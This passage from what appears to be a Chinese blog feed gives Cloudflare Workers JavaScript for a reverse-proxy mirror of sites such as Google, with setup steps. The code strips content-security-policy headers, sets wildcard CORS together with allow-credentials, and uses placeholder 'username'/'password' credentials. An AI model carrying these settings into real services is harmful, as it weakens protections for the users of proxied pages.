class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 替换成你想镜像的站点</span></span><br><span class="line"><span class="keyword">const</span> upstream = <span class="string">&#x27;google.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果那个站点有专门的移动适配站点，否则保持和上面一致</span></span><br><span class="line"><span class="keyword">const</span> upstream_mobile = <span class="string">&#x27;m.google.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 密码访问</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> openAuth = <span class="literal">false</span></span><br><span class="line"><span class="keyword">const</span> username = <span class="string">&#x27;username&#x27;</span></span><br><span class="line"><span class="keyword">const</span> password = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你希望禁止哪些国家访问</span></span><br><span class="line"><span class="keyword">const</span> blocked_region = [<span class="string">&#x27;KP&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止自访问</span></span><br><span class="line"><span class="keyword">const</span> blocked_ip_address = [<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换成你想镜像的站点</span></span><br><span class="line"><span class="keyword">const</span> replace_dict = &#123;</span><br><span class="line">    <span class="string">&#x27;$upstream&#x27;</span>: <span class="string">&#x27;$custom_domain&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;//google.com&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">unauthorized</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Unauthorized&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;WWW-Authenticate&#x27;</span>: <span class="string">&#x27;Basic realm=&quot;goindex&quot;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">status</span>: <span class="number">401</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseBasicAuth</span>(<span class="params">auth</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">atob</span>(auth.<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>).<span class="title function_">pop</span>()).<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doBasicAuth</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> auth = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Authorization&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!auth || !<span class="regexp">/^Basic [A-Za-z0-9._~+/-]+=*$/i</span>.<span class="title function_">test</span>(auth)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [user, pass] = <span class="title function_">parseBasicAuth</span>(auth);</span><br><span class="line">  <span class="keyword">return</span> user === username &amp;&amp; pass === password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAndApply</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (request.<span class="property">method</span> === <span class="string">&#x27;OPTIONS&#x27;</span>) <span class="comment">// allow preflight request</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">      <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>: <span class="string">&#x27;GET, POST, PUT, HEAD, OPTIONS&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (openAuth &amp;&amp; !<span class="title function_">doBasicAuth</span>(request)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">unauthorized</span>();</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">const</span> region = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-ipcountry&#x27;</span>).<span class="title function_">toUpperCase</span>();</span><br><span class="line">    <span class="keyword">const</span> ip_address = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-connecting-ip&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> user_agent = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;user-agent&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> response = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">    <span class="keyword">let</span> url_host = url.<span class="property">host</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">protocol</span> == <span class="string">&#x27;http:&#x27;</span>) &#123;</span><br><span class="line">        url.<span class="property">protocol</span> = <span class="string">&#x27;https:&#x27;</span></span><br><span class="line">        response = <span class="title class_">Response</span>.<span class="title function_">redirect</span>(url.<span class="property">href</span>);</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">device_status</span>(user_agent)) &#123;</span><br><span class="line">        upstream_domain = upstream</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        upstream_domain = upstream_mobile</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    url.<span class="property">host</span> = upstream_domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (blocked_region.<span class="title function_">includes</span>(region)) &#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: WorkersProxy is not available in your region yet.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(blocked_ip_address.<span class="title function_">includes</span>(ip_address))&#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: Your IP address is blocked by WorkersProxy.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> method = request.<span class="property">method</span>;</span><br><span class="line">        <span class="keyword">let</span> request_headers = request.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_request_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(request_headers);</span><br><span class="line"></span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Host&#x27;</span>, upstream_domain);</span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Referer&#x27;</span>, url.<span class="property">href</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> original_response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url.<span class="property">href</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: method,</span><br><span class="line">            <span class="attr">headers</span>: new_request_headers</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> original_response_clone = original_response.<span class="title function_">clone</span>();</span><br><span class="line">        <span class="keyword">let</span> original_text = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">let</span> response_headers = original_response.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_response_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(response_headers);</span><br><span class="line">        <span class="keyword">let</span> status = original_response.<span class="property">status</span>;</span><br><span class="line"></span><br><span class="line">        new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-credentials&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy-report-only&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;clear-site-data&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> content_type = new_response_headers.<span class="title function_">get</span>(<span class="string">&#x27;content-type&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (content_type.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>) &amp;&amp; content_type.<span class="title function_">includes</span>(<span class="string">&#x27;UTF-8&#x27;</span>)) &#123;</span><br><span class="line">            original_text = <span class="keyword">await</span> <span class="title function_">replace_response_text</span>(original_response_clone, upstream_domain, url_host);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            original_text = original_response_clone.<span class="property">body</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(original_text, &#123;</span><br><span class="line">            status,</span><br><span class="line">            <span class="attr">headers</span>: new_response_headers</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;fetch&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    event.<span class="title function_">respondWith</span>(<span class="title function_">fetchAndApply</span>(event.<span class="property">request</span>).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(err.<span class="property">stack</span>), &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">500</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;));</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">replace_response_text</span>(<span class="params">response, upstream_domain, host_name</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> replace_dict) &#123;</span><br><span class="line">        j = replace_dict[i]</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            i = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            i = host_name</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (j == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            j = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            j = host_name</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(i, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">        text = text.<span class="title function_">replace</span>(re, j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">device_status</span> (user_agent_info) &#123;</span><br><span class="line">    <span class="keyword">var</span> agents = [<span class="string">&quot;Android&quot;</span>, <span class="string">&quot;iPhone&quot;</span>, <span class="string">&quot;SymbianOS&quot;</span>, <span class="string">&quot;Windows Phone&quot;</span>, <span class="string">&quot;iPad&quot;</span>, <span class="string">&quot;iPod&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; agents.<span class="property">length</span>; v++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (user_agent_info.<span class="title function_">indexOf</span>(agents[v]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="/2020/01/17/Cloudflare-Workers-Section2/">下篇：Cloudflare Workers绑定自定义域名进行访问</a></p><p>这就是JSPROXY的反代啦，祝各位成功呀！<br>题外话：</p><p>下周要考试了，我好方，怎么办</p><p>我已经用此方法部署了Google镜像站、Google学术镜像站、wiki镜像站，可以在我的友链界面找到哦~</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白嫖党教你白嫖Cloudflare Workers反代~</title>
      <link href="/posts/CloudFlare-Workers/"/>
      <url>/posts/CloudFlare-Workers/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="/2019/10/25/CloudFlare-Workers-Section1/"><strong><font color=#FF0000>注：本页面为旧版本备份，新版本请点我！</font></strong></a></p><p>CloudFlare一直以其域名托管服务和CDN服务闻名于各位网站管理员，当然我的域名也是托管在这个上面的，后来，有一位被我介绍入CF的同志告诉我CF有种功能。。。（<a href="https://bairuo.top/">@TheBaiRuo</a>）</p><p>就是CF的Workers服务，这是一种能够访问网页时运行特定的JS脚本的服务，所以我们就可以利用它进行 <del>JSPROXY</del> Workers-Proxy（感谢@Anonymous的提醒）的搭建（某反向代理）</p><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><p>1、一个CloudFlare账号</p><p>2、一个域名（可以到Freenom注册一个）</p><h4 id="搭建反向代理"><a href="#搭建反向代理" class="headerlink" title="搭建反向代理"></a>搭建反向代理</h4><p>在这之前，你需要把你的域名托管到CF上！！！</p><p>然后进入CF的workers界面，看下图</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Cloudflare-Workers/into-workers.png" alt="Workers"></p><p>进入到Workers后，点击Create a Worker来创建你的第一个JS</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Cloudflare-Workers/Workers-Interface.png" alt="Create a Worker"></p><p>然后在workers界面的左边，填入你的JS代码，这时候就需要万能反代代码QAQ</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Cloudflare-Workers/Workers-Edit.png" alt="Worker Editor"></p><p>解释一下这个界面：</p><p>①项目名称：表现为**[Project].[subdomain].workers.dev**，其中subdomain是你注册workers是输入的名字，project就是项目名称</p><p>②编辑区：就是你放下代码的地方</p><p>③效果预览区：当你按下运行按钮的时候展现出来的效果</p><p>④运行：顾名思义，运行嘛，然后在右边看得到</p><p>⑤保存并部署：部署该项目</p><p>将下面的代码放到你的编辑区中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 替换成你想镜像的站点</span></span><br><span class="line"><span class="keyword">const</span> upstream = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 如果那个站点有专门的移动适配站点，否则保持和上面一致</span></span><br><span class="line"><span class="keyword">const</span> upstream_mobile = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 你希望禁止哪些国家访问</span></span><br><span class="line"><span class="keyword">const</span> blocked_region = [<span class="string">&#x27;KP&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 禁止自访问</span></span><br><span class="line"><span class="keyword">const</span> blocked_ip_address = [<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 替换成你想镜像的站点</span></span><br><span class="line"><span class="keyword">const</span> replace_dict = &#123;</span><br><span class="line">    <span class="string">&#x27;$upstream&#x27;</span>: <span class="string">&#x27;$custom_domain&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;//google.com&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//以下内容都不用动</span></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;fetch&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    event.<span class="title function_">respondWith</span>(<span class="title function_">fetchAndApply</span>(event.<span class="property">request</span>));</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAndApply</span>(<span class="params">request</span>) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> region = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-ipcountry&#x27;</span>).<span class="title function_">toUpperCase</span>();</span><br><span class="line">    <span class="keyword">const</span> ip_address = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-connecting-ip&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> user_agent = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;user-agent&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> response = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">    <span class="keyword">let</span> url_host = url.<span class="property">host</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">protocol</span> == <span class="string">&#x27;http:&#x27;</span>) &#123;</span><br><span class="line">        url.<span class="property">protocol</span> = <span class="string">&#x27;https:&#x27;</span></span><br><span class="line">        response = <span class="title class_">Response</span>.<span class="title function_">redirect</span>(url.<span class="property">href</span>);</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">device_status</span>(user_agent)) &#123;</span><br><span class="line">        upstream_domain = upstream</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        upstream_domain = upstream_mobile</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    url.<span class="property">host</span> = upstream_domain;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (blocked_region.<span class="title function_">includes</span>(region)) &#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: WorkersProxy is not available in your region yet.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(blocked_ip_address.<span class="title function_">includes</span>(ip_address))&#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: Your IP address is blocked by WorkersProxy.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> method = request.<span class="property">method</span>;</span><br><span class="line">        <span class="keyword">let</span> request_headers = request.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_request_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(request_headers);</span><br><span class="line"> </span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Host&#x27;</span>, upstream_domain);</span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Referer&#x27;</span>, url.<span class="property">href</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> original_response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url.<span class="property">href</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: method,</span><br><span class="line">            <span class="attr">headers</span>: new_request_headers</span><br><span class="line">        &#125;)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> original_response_clone = original_response.<span class="title function_">clone</span>();</span><br><span class="line">        <span class="keyword">let</span> original_text = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">let</span> response_headers = original_response.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_response_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(response_headers);</span><br><span class="line">        <span class="keyword">let</span> status = original_response.<span class="property">status</span>;</span><br><span class="line"> </span><br><span class="line">        new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        